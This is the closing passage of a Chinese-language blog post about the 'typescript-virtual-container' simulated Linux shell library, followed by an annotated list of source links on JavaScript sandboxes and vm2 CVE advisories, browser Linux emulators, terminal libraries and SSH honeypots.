`typescript-virtual-container` 填补了其他方案都无法触及的空白：一个完整的、可编程的 Linux Shell 环境，带有真实 SSH、SFTP、POSIX 权限、用户管理、虚拟网络和类型化的 TypeScript API----运行在约 10 MB 内存中、不到一秒启动、同时在 Node.js 和浏览器中工作。

如果你想去试试：源码在 [github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container)，还有一个在线演示（包括 `startxfce4` 的完整桌面，真的超酷）在 [itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo)。去看看吧，给 Fortune 在 GitHub 上点点星，她值得！

感谢阅读----即使按我的标准这也是一篇超长的文章 :) 希望它有用！

---

## 来源

我尽量将每个声明链接到主要来源----CVE 公告、官方文档、GitHub 仓库、维护者的博客文章。几点说明：vm2 CVE 列表在不断增加，所以你读到的时候 FortiGuard 链接可能已经过时（请查看 GitHub 公告页面获取最新信息）。Bellard 的链接都稳定----他的个人网站一直在线，内容不会更改。如果你想深入了解任何填充库，直接浏览 `typescript-virtual-container` 仓库中的 `polyfills/` 文件夹----它比我在这里能写的任何描述都更易读。

### JavaScript 沙箱

- **Node.js `vm` 模块** ---- 官方文档：[nodejs.org/api/vm.html](https://nodejs.org/api/vm.html)
- **Node.js `vm` 安全警告** ---- "vm 模块不是安全机制。不要用它运行不可信代码"：[nodejs.org/api/vm.html#vm-executing-javascript](https://nodejs.org/api/vm.html)
- **`vm2`** ---- npm：[npmjs.com/package/vm2](https://www.npmjs.com/package/vm2) · GitHub：[github.com/patriksimek/vm2](https://github.com/patriksimek/vm2)
- **vm2 CVE 时间线** ---- FortiGuard 爆发警报，含完整 CVE 列表和日期：[fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape](https://fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape)
- **CVE-2023-29017** ---- 异步错误栈逃逸，GHSA：[github.com/advisories/GHSA-7jxr-cg7f-gpgv](https://github.com/advisories/GHSA-7jxr-cg7f-gpgv)
- **CVE-2023-32314** ---- Proxy + Error.name + Function 逃逸，PoC gist：[gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac](https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac)
- **CVE-2023-37466** ---- Exploit DB 条目，含完整 PoC：[exploit-db.com/exploits/51898](https://www.exploit-db.com/exploits/51898)
- **vm2 2026 CVE** ---- 11 个新沙箱逃逸，分析：[thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956](https://thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956) · BleepingComputer：[bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library](https://www.bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library/)
- **"为什么在 JS 中沙箱 JS 很难"** ---- oxeye.io 对 CVE-2022-36067 的事后分析：[oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067](https://www.oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067)
- **`isolated-vm`** ---- npm：[npmjs.com/package/isolated-vm](https://www.npmjs.com/package/isolated-vm) · GitHub：[github.com/laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)
- **V8 Isolate 内部** ---- 嵌入指南：[v8.dev/docs/embed](https://v8.dev/docs/embed)
- **`quickjs-emscripten`** ---- npm：[npmjs.com/package/quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten) · GitHub：[github.com/justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)
- **`@sebastianwessel/quickjs`** ---- npm：[npmjs.com/package/@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs) · GitHub：[github.com/sebastianwessel/quickjs](https://github.com/sebastianwessel/quickjs)
- **QuickJS 引擎** ---- 作者 Fabrice Bellard：[bellard.org/quickjs](https://bellard.org/quickjs/)
- **Deno 权限模型** ---- 文档：[docs.deno.com/runtime/fundamentals/security](https://docs.deno.com/runtime/fundamentals/security/)
- **Deno 2 发布** ---- 2024 年 10 月：[deno.com/blog/v2](https://deno.com/blog/v2)
- **TC39 ShadowRealm 提案** ---- [github.com/tc39/proposal-shadowrealm](https://github.com/tc39/proposal-shadowrealm)
- **TC39 Compartments 提案** ---- [github.com/nicolo-ribaudo/tc39-proposal-compartments](https://github.com/nicolo-ribaudo/tc39-proposal-compartments)
- **"沙箱 JavaScript 代码"** ---- Andrew Healey 关于 Deno 沙箱方法的实践分析：[healeycodes.com/sandboxing-javascript-code](https://healeycodes.com/sandboxing-javascript-code)

### Linux 仿真器

- **`v86`** ---- npm：[npmjs.com/package/v86](https://www.npmjs.com/package/v86) · GitHub：[github.com/copy/v86](https://github.com/copy/v86) · 演示：[copy.sh/v86](https://copy.sh/v86)
- **v86 操作系统支持矩阵** ---- [github.com/copy/v86#operating-system-support](https://github.com/copy/v86)
- **SeaBIOS**（v86 使用的 BIOS）---- [seabios.org](https://www.seabios.org/SeaBIOS)
- **Bochs VBE 扩展**（VGA 参考）---- [bochs.sourceforge.io](https://bochs.sourceforge.io/)
- **JSLinux** ---- Bellard 的仿真器：[bellard.org/jslinux](https://bellard.org/jslinux/) · 技术说明（TinyEMU、历史、asm.js→Wasm）：[bellard.org/jslinux/tech.html](https://bellard.org/jslinux/tech.html)
- **TinyEMU** ---- C 源码：[bellard.org/tinyemu](https://bellard.org/tinyemu/) · 非官方 GitHub 镜像：[github.com/yoshijava/TinyEMU](https://github.com/yoshijava/TinyEMU)
- **jor1k** ---- OpenRISC JS 仿真器：[github.com/s-macke/jor1k](https://github.com/s-macke/jor1k) · 演示：[s-macke.github.io/jor1k/demos/main.html](https://s-macke.github.io/jor1k/demos/main.html)
- **CheerpX** ---- 文档：[cheerpx.io/docs/overview](https://cheerpx.io/docs/overview) · pthreads 指南：[cheerpx.io/docs/guides/pthreads](https://cheerpx.io/docs/guides/pthreads)
- **WebContainers** ---- npm：[npmjs.com/package/@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api) · API 文档：[webcontainers.io](https://webcontainers.io) · 发布公告：[blog.stackblitz.com/posts/webcontainer-api-is-here](https://blog.stackblitz.com/posts/webcontainer-api-is-here/) · InfoQ 概述：[infoq.com/news/2021/07/webcontainers-nodejs](https://www.infoq.com/news/2021/07/webcontainers-nodejs/)
- **container2wasm** ---- GitHub：[github.com/container2wasm/container2wasm](https://github.com/container2wasm/container2wasm) · NTT 博客文章：[medium.com/nttlabs/container2wasm-2dd90a18cc9a](https://medium.com/nttlabs/container2wasm-2dd90a18cc9a) · Simon Willison 评论：[simonwillison.net/2024/Jan/3/container2wasm](https://simonwillison.net/2024/Jan/3/container2wasm/)

### 终端栈

- **xterm.js** ---- npm：[npmjs.com/package/@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm) · GitHub：[github.com/xtermjs/xterm.js](https://github.com/xtermjs/xterm.js) · 网站：[xtermjs.org](https://xtermjs.org)
- **node-pty** ---- npm：[npmjs.com/package/node-pty](https://www.npmjs.com/package/node-pty) · GitHub（微软）：[github.com/microsoft/node-pty](https://github.com/microsoft/node-pty)

### 蜜罐

- **Cowrie** ---- GitHub：[github.com/cowrie/cowrie](https://github.com/cowrie/cowrie) · 文档：[docs.cowrie.org](https://docs.cowrie.org) · 网站：[cowrie.org](https://www.cowrie.org/)
- **Kippo** ---- GitHub（已归档）：[github.com/desaster/kippo](https://github.com/desaster/kippo)
- **endlessh** ---- GitHub：[github.com/skeeto/endlessh](https://github.com/skeeto/endlessh)
- **sshesame** ---- GitHub：[github.com/jaksi/sshesame](https://github.com/jaksi/sshesame)
- **Lyrebird** ---- Docker Hub：[hub.docker.com/r/lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)
- **node-simple-ssh-honeypot** ---- 最小化 Node.js SSH 蜜罐：[github.com/Caesarovich/node-simple-ssh-honeypot](https://github.com/Caesarovich/node-simple-ssh-honeypot)
- **awesome-honeypots** ---- 精选列表：[github.com/paralax/awesome-honeypots](https://github.com/paralax/awesome-honeypots)
- **MITRE ATT&CK T1082** ---- 系统信息发现（攻击者如何识别蜜罐）：[attack.mitre.org/techniques/T1082](https://attack.mitre.org/techniques/T1082/)

### `typescript-virtual-container`

- **npm**：[npmjs.com/package/typescript-virtual-container](https://www.npmjs.com/package/typescript-virtual-container)
- **GitHub**：[github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container)
- **在线演示**：[itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo)
- **架构指南**：[github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md](https://github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md)
- **`ssh2`**（SSH 协议实现）---- npm：[npmjs.com/package/ssh2](https://www.npmjs.com/package/ssh2) · GitHub：[github.com/mscdex/ssh2](https://github.com/mscdex/ssh2)
- **`fflate`**（VFS 快照压缩）---- npm：[npmjs.com/package/fflate](https://www.npmjs.com/package/fflate)
- **`ws`**（WebSocket Shell 传输）---- npm：[npmjs.com/package/ws](https://www.npmjs.com/package/ws)

### 背景阅读

- **POSIX 权限模型** ---- Open Group 规范：[pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html](https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html)
- **预写日志**（VFS 持久化使用的模式）---- [en.wikipedia.org/wiki/Write-ahead_logging](https://en.wikipedia.org/wiki/Write-ahead_logging)
- **V8 Isolate 模型** ---- "嵌入器指南"：[v8.dev/docs/embed](https://v8.dev/docs/embed)
- **RISC-V ISA 规范**（TinyEMU/JSLinux 背景）---- [riscv.org/technical/specifications](https://riscv.org/technical/specifications/)
- **OpenRISC 1000 架构** ---- [opencores.org/or1k](https://opencores.org/or1k/)
- **"通过 Deno 在 Pyodide 沙箱中运行 Python 代码"** ---- Simon Willison TIL，与 Wasm 方法的有益对比：[til.simonwillison.net](https://til.simonwillison.net/deno/pyodide-sandbox)
- **"在浏览器中运行自托管 QuickJS"** ---- Simon Willison TIL 关于 quickjs-emscripten 包大小：[til.simonwillison.net/npm/self-hosted-quickjs](https://til.simonwillison.net/npm/self-hosted-quickjs)
